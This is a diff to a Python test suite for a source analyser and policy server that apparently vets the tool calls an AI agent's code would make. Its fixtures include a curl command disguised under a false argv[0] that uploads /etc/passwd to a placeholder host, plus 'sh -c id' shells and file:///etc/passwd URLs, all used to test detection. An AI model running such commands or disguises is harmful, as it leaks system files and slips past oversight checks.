@@ -5541,6 +5541,9 @@ class SourceReader(unittest.TestCase):
                  None),
                 ('import os\nos.execlp("sh", "sh", "-c", "id")', [("shell", {"command": ["sh", "-c", "id"]})], None),
                 ('import os\nos.execle("/bin/sh", "sh", "-c", "id", {})', [], "argv"),
+                # the path runs, not the argv[0] the caller names
+                ('import os\nos.execv("/usr/bin/curl", ["ls", "-T", "/etc/passwd", "x.test"])',
+                 [("shell", {"command": ["/usr/bin/curl", "-T", "/etc/passwd", "x.test"]})], None),
                 ('import os\nos.execvp(name, ["sh"])', [], "argv"),
                 ('subprocess.run("id", shell=flag)', [], "arg")]:
             with self.subTest(code=code):
@@ -5576,7 +5579,7 @@ class SourceReader(unittest.TestCase):
             with self.subTest(scope=scope):
                 start = time.monotonic()
                 r = source.read(names + f"{scope}\n" * 1500)
-                self.assertLess(time.monotonic() - start, 1)
+                self.assertLess(time.monotonic() - start, 5)
                 self.assertEqual(r.held, "budget")
         for n in (16, 20, 22):
             with self.subTest(n=n):
@@ -5627,6 +5630,23 @@ class SourceReader(unittest.TestCase):
             with self.subTest(code=code):
                 r = source.read(code)
                 self.assertEqual((r.calls, r.held), ([], cause))
+
+    def test_what_a_branch_a_function_or_a_call_result_hides_is_held(self):
+        """Each of these was decided as a call other than the one that runs, or not read at all."""
+        for code, urls, held in [
+                # an exec in a branch may not run: its assignment is not the value
+                ('url = "file:///etc/passwd"\nif input():\n    exec("url = \'https://docs.python.org/\'")\n'
+                 'goto_url(url)', [], "arg"),
+                # a body runs when called, with the names as they are then
+                ('u = "https://docs.python.org/"\ndef f():\n    goto_url(u)\nu = "file:///etc/passwd"\nf()', [], "arg"),
+                ('def f(press_key):\n    press_key("Enter")', [], "call"),   # a parameter is whatever is passed
+                ('f()("file:///etc/passwd")', [], "call"),
+                ('functools.partial(goto_url, "file:///etc/passwd")()', [], "call"),
+                ('while input():\n    goto_url("file:///etc/passwd")', ["file:///etc/passwd"], None),
+                ('d = {}\nd[goto_url("file:///etc/passwd")]: int', ["file:///etc/passwd"], None)]:
+            with self.subTest(code=code):
+                r = source.read(code)
+                self.assertEqual(([c[1]["url"] for c in r.calls], r.held), (urls, held))
 
     def test_a_call_in_a_binding_target_is_read(self):
         for code in ('d[goto_url("file:///etc/passwd")] = 1',
@@ -5858,6 +5878,17 @@ class CellSource(unittest.TestCase):
             d = self.cell(self.strict, 'goto_url("https://docs.python.org/")')
         self.assertEqual((d["verdict"], d["rule_ids"], d.get("nondeterministic")),
                          ("deny", ["TK-SOURCE-PARSE"], True))
+
+    def test_a_sub_calls_rule_whose_match_ran_out_of_time_denies(self):
+        real = self.server.decide
+
+        def timed_out(tool, args, cls=None, untrusted=None, _hidden=0, _budget=None, _pieces=True):
+            if _budget is not None:
+                return {"verdict": "flag", "rule_ids": ["TK-F012"], "nondeterministic": True}
+            return real(tool, args, cls, untrusted, _hidden, _budget, _pieces)
+        with mock.patch.object(self.server, "decide", side_effect=timed_out):
+            d = self.cell(self.server, 'goto_url("https://docs.python.org/")')
+        self.assertEqual((d["verdict"], d["rule_ids"], d.get("nondeterministic")), ("deny", ["TK-F012"], True))
 
     def test_a_sub_call_keeps_its_own_section(self):
         for e, code, verdict, rule in [
